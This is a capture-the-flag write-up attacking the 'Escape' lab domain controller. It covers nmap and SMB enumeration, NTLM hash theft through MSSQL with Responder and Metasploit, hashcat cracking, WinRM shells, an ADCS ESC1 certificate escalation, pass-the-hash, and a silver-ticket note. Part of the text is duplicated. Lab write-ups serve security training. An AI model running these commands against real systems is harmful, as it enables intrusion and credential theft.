---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Escape

## Nmap

`sudo nmap -sV -sC -Pn -v 10.10.11.202`

```
Discovered open port 135/tcp on 10.10.11.202
Discovered open port 445/tcp on 10.10.11.202
Discovered open port 53/tcp on 10.10.11.202
Discovered open port 139/tcp on 10.10.11.202
Discovered open port 88/tcp on 10.10.11.202
Discovered open port 3268/tcp on 10.10.11.202
Discovered open port 389/tcp on 10.10.11.202
Discovered open port 3269/tcp on 10.10.11.202
Discovered open port 593/tcp on 10.10.11.202
Discovered open port 636/tcp on 10.10.11.202
Discovered open port 1433/tcp on 10.10.11.202
Discovered open port 464/tcp on 10.10.11.202
Not shown: 988 filtered tcp ports (no-response)                                                                                                              
PORT     STATE SERVICE       VERSION                                                                                                                         
53/tcp   open  domain        Simple DNS Plus                                                                                                                 
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-28 20:41:59Z)       
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                   [65/150]
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                   
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                   
|_ssl-date: 2023-04-28T20:43:19+00:00; +8h00m00s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                
| Issuer: commonName=sequel-DC-CA                                                                                                                            
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-11-18T21:20:35                                                                                                                      
| Not valid after:  2023-11-18T21:20:35                                                                                                                      
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                                                                    
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                                                                                            
445/tcp  open  microsoft-ds?                                                                                                                                 
464/tcp  open  kpasswd5?                                                                                                                                     
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                             
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                   
|_ssl-date: 2023-04-28T20:43:20+00:00; +8h00m00s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                
| Issuer: commonName=sequel-DC-CA                                                                                                                            
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-11-18T21:20:35                                                                                                                      
| Not valid after:  2023-11-18T21:20:35                                                                                                                      
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                                                                    
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                                                                                            
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM                                                                                    
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)                                                                                              
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                                     
| Issuer: commonName=SSL_Self_Signed_Fallback                                                                                                                
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2023-04-28T20:39:52                                                                                                                      
| Not valid after:  2053-04-28T20:39:52                                                                                                                      
| MD5:   06f009e94cb30ee1e6aeb37edc303e52                                                                                                                    
|_SHA-1: 881c876da2e83cf1972ff6d1d9632ace2965a647                                                                                                            
|_ssl-date: 2023-04-28T20:43:19+00:00; +8h00m00s from scanner time.                                                                                          
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug) 
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                   
|_ssl-date: 2023-04-28T20:43:19+00:00; +8h00m00s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                
| Issuer: commonName=sequel-DC-CA                                                                                                                            
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-11-18T21:20:35                                                                                                                      
| Not valid after:  2023-11-18T21:20:35                                                                                                                      
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                                                                    
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                                                                                            
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                   
|_ssl-date: 2023-04-28T20:43:20+00:00; +8h00m00s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                
| Issuer: commonName=sequel-DC-CA                                                                                                                            
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-11-18T21:20:35                                                                                                                      
| Not valid after:  2023-11-18T21:20:35                                                                                                                      
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                                                                    
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                                                                                            
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-28T20:42:41
|_  start_date: N/A

```

The domain name is `sequel.htb`

## SMB

There is samba, check what is publicly accessable

NOTE: you can use `crackmapexec` for that. See: https://wiki.porchetta.industries/smb-protocol/enumeration/enumerate-shares-and-access

```
crackmapexec smb 10.10.11.202 --shares
# Or with fake user
crackmapexec smb 10.10.11.202 -u madeupname -p '' --shares
```

Download what is in the share

```
smbclient -N -L 10.10.11.202
smbclient -N \\\\10.10.11.202\\Public
get "SQL Server Procedures.pdf"
```

That will point us to a user in the database First install **MS SQL linux tool** https://learn.microsoft.com/en-us/sql/linux/quickstart-install-connect-ubuntu?view=sql-server-ver16 And run it based on the .pdf file

```
sqlcmd -S 10.10.11.202 -U PublicUser -P GuestUserCantWrite1
```

The SQL server does not contain interesting stuff, and I can't execute. But maybe I can steal NTLM hash to log in.

Following this writeup to steal NTLM: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#metasploit-need-creds (using metasploit)

First I need to start `Responder` https://github.com/lgandx/Responder

```
sudo python3 Responder.py -I tun0
```

Then I execute the exploit in metasploit

```
#Set USERNAME, RHOSTS, PASSWORD, SMBPROXY

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
```

```

Escape
Nmap

sudo nmap -sV -sC -Pn -v 10.10.11.202

Discovered open port 135/tcp on 10.10.11.202
Discovered open port 445/tcp on 10.10.11.202
Discovered open port 53/tcp on 10.10.11.202
Discovered open port 139/tcp on 10.10.11.202
Discovered open port 88/tcp on 10.10.11.202
Discovered open port 3268/tcp on 10.10.11.202
Discovered open port 389/tcp on 10.10.11.202
Discovered open port 3269/tcp on 10.10.11.202
Discovered open port 593/tcp on 10.10.11.202
Discovered open port 636/tcp on 10.10.11.202
Discovered open port 1433/tcp on 10.10.11.202
Discovered open port 464/tcp on 10.10.11.202
Not shown: 988 filtered tcp ports (no-response)                                                                                                              
PORT     STATE SERVICE       VERSION                                                                                                                         
53/tcp   open  domain        Simple DNS Plus                                                                                                                 
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-28 20:41:59Z)       
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                   [65/150]
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                   
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                   
|_ssl-date: 2023-04-28T20:43:19+00:00; +8h00m00s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                
| Issuer: commonName=sequel-DC-CA                                                                                                                            
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-11-18T21:20:35                                                                                                                      
| Not valid after:  2023-11-18T21:20:35                                                                                                                      
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                                                                    
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                                                                                            
445/tcp  open  microsoft-ds?                                                                                                                                 
464/tcp  open  kpasswd5?                                                                                                                                     
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                             
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                   
|_ssl-date: 2023-04-28T20:43:20+00:00; +8h00m00s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                
| Issuer: commonName=sequel-DC-CA                                                                                                                            
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-11-18T21:20:35                                                                                                                      
| Not valid after:  2023-11-18T21:20:35                                                                                                                      
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                                                                    
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                                                                                            
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM                                                                                    
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)                                                                                              
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                                     
| Issuer: commonName=SSL_Self_Signed_Fallback                                                                                                                
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2023-04-28T20:39:52                                                                                                                      
| Not valid after:  2053-04-28T20:39:52                                                                                                                      
| MD5:   06f009e94cb30ee1e6aeb37edc303e52                                                                                                                    
|_SHA-1: 881c876da2e83cf1972ff6d1d9632ace2965a647                                                                                                            
|_ssl-date: 2023-04-28T20:43:19+00:00; +8h00m00s from scanner time.                                                                                          
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug) 
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                   
|_ssl-date: 2023-04-28T20:43:19+00:00; +8h00m00s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                
| Issuer: commonName=sequel-DC-CA                                                                                                                            
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-11-18T21:20:35                                                                                                                      
| Not valid after:  2023-11-18T21:20:35                                                                                                                      
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                                                                    
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                                                                                            
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                   
|_ssl-date: 2023-04-28T20:43:20+00:00; +8h00m00s from scanner time.                                                                                          
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                
| Issuer: commonName=sequel-DC-CA                                                                                                                            
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-11-18T21:20:35                                                                                                                      
| Not valid after:  2023-11-18T21:20:35                                                                                                                      
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                                                                                    
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                                                                                            
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-28T20:42:41
|_  start_date: N/A

sequel.htb
DNS

dig any sequel.htb @10.10.11.202

; <<>> DiG 9.18.12-1-Debian <<>> any sequel.htb @10.10.11.202
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 3792
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;sequel.htb.                    IN      ANY

;; ANSWER SECTION:
sequel.htb.             600     IN      A       10.10.11.202
sequel.htb.             3600    IN      NS      dc.sequel.htb.
sequel.htb.             3600    IN      SOA     dc.sequel.htb. hostmaster.sequel.htb. 143 900 600 86400 3600
sequel.htb.             600     IN      AAAA    dead:beef::3c
sequel.htb.             600     IN      AAAA    dead:beef::ac13:7b0e:7e08:9e4b

;; ADDITIONAL SECTION:
dc.sequel.htb.          3600    IN      A       10.10.11.202
dc.sequel.htb.          3600    IN      AAAA    dead:beef::ac13:7b0e:7e08:9e4b
dc.sequel.htb.          3600    IN      AAAA    dead:beef::3c

;; Query time: 28 msec
;; SERVER: 10.10.11.202#53(10.10.11.202) (TCP)
;; WHEN: Fri Apr 28 09:02:50 EDT 2023
;; MSG SIZE  rcvd: 247

SMB

smbclient -N -L 10.10.11.202
smbclient -N \\\\10.10.11.202\\Public
get "SQL Server Procedures.pdf"

MS SQL linux tool

https://learn.microsoft.com/en-us/sql/linux/quickstart-install-connect-ubuntu?view=sql-server-ver16
MS SQL

sqlcmd -S 10.10.11.202 -U PublicUser -P GuestUserCantWrite1
NTLM hash

obtained from https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#metasploit-need-creds using https://github.com/lgandx/Responder

#Set USERNAME, RHOSTS, PASSWORD, SMBPROXY

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:15182401db287ebc:B81590CA2DAAB1EDCE118E24C3311E79:01010000000000008094CE3AEC79D901E9A9FA56AD6E0FA4000000000200080051004D003300470001001E00570049004E002D004600370030004D00430055004900520035004500470004003400570049004E002D004600370030004D0043005500490052003500450047002E0051004D00330047002E004C004F00430041004C000300140051004D00330047002E004C004F00430041004C000500140051004D00330047002E004C004F00430041004C00070008008094CE3AEC79D9010600040002000000080030003000000000000000000000000030000008A4240C048EF2AF530E5FE4CAE1D5D718540708FDEE97F2DBED4728601858E80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370034000000000000000000
```

Then, use **hashcat** to crack it. `hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt -O`

`sequel/SQL_SVC REGGIE1234ronnie`

With the credentials use Win-RM to get shell.

### Win-RM

`evil-winrm -i 10.10.11.202 -u SQL_SVC -p REGGIE1234ronnie`

# User

User credentials found in the logs `C:\SQLServer\Logs> cat errorlog.bak`

```
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
```

Use it to login using Win-RM `evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3`

Flag: `C:\Users\Ryan.Cooper\Desktop> cat user.txt`

## User -> ~~Root~~ Administrator

Since it is a domain machine, let's try the AD enumeration first.

### AD Enumeration

**Unconstrained Delegation**

```
nxc ldap 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 --trusted-for-delegation
```

Nope

**Kerberoasting**

```
nxc ldap 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 --kerberoasting output.txt
```

Nope

**ADCS**

```
nxc ldap 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 -M adcs                   
```

It found CN `sequel-DC-CA`. Let's look there

```
nxc ldap 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 -M adcs -o SERVER=sequel-DC-CA 
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.202    636    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 
ADCS        10.10.11.202    389    DC               Using PKI CN: sequel-DC-CA
ADCS        10.10.11.202    389    DC               [*] Starting LDAP search with search filter '(distinguishedName=CN=sequel-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,'
ADCS        10.10.11.202    389    DC               Found Certificate Template: UserAuthentication
ADCS        10.10.11.202    389    DC               Found Certificate Template: DirectoryEmailReplication
ADCS        10.10.11.202    389    DC               Found Certificate Template: DomainControllerAuthentication
ADCS        10.10.11.202    389    DC               Found Certificate Template: KerberosAuthentication
ADCS        10.10.11.202    389    DC               Found Certificate Template: EFSRecovery
ADCS        10.10.11.202    389    DC               Found Certificate Template: EFS
ADCS        10.10.11.202    389    DC               Found Certificate Template: DomainController
ADCS        10.10.11.202    389    DC               Found Certificate Template: WebServer
ADCS        10.10.11.202    389    DC               Found Certificate Template: Machine
ADCS        10.10.11.202    389    DC               Found Certificate Template: User
ADCS        10.10.11.202    389    DC               Found Certificate Template: SubCA
ADCS        10.10.11.202    389    DC               Found Certificate Template: Administrator
```

There ceartaily is something. Let's use `certipy` if there are vulnerabilities.

```
certipy-ad find -dc-ip 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 -vulnerable -stdout
```

And that is a hit! The `UserAuthentication` template is vulnerable to ESC1

### Exploiting ESC1

I followed the Hacktricks guide for exploiting this vulnerability. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1

First, I request the certificate from the template. I have it to give me a certificate of administrator account. It might not work on fisrt (don't  know why), but give it few tries.

```
certipy-ad req -target-ip 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'administrator@sequel.htb'
```

With the certificate, you can use it to authenticate. This would give you a valid ticket for administrator.

```
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'sequel.htb' -dc-ip 10.10.11.202
```

Most likely, you will encounter a time skew problem. To fix that you need to synchronise clock with the server. Fisrt disable time autoupdate, and then set th time according to the target server.

```
# Disable autoupdate
timedatectl set-ntp off
# Get time from the machine
sudo rdate -n 10.10.11.202
```

Now try it again.

```
certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'sequel.htb' -dc-ip 10.10.11.202
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

Now you get the ticket and hash to authenticate. Just *pass the hash* to login using it.

```
evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

And that's it. Grab the flag and go to town.

## Alternative Path to Root

According to https://0xdf.gitlab.io/2023/06/17/htb-escape.html#beyond-root---silver-ticket, there is an alternative path by forging "Silver ticket" from the `SQL_SVC` credentials.

Silver ticket is forged Ticket Granting Service (TGS) ticket, signed by a service account (therefore it is limited to that service). But that does not matter, as you can read with the MSSQL and as an administartor, even enable `xp_cmdshell` for shell.

For getting the silver ticket, you need service password hash (generate from `REGGIE1234ronnie`), domain SID (you can query it), domain name (you have it: `sequel.htb`), SPN (anything goes), and name of user to impersonate (`administrator@sequel.htb`). Also, the DC is never contacted, so all the logs are local!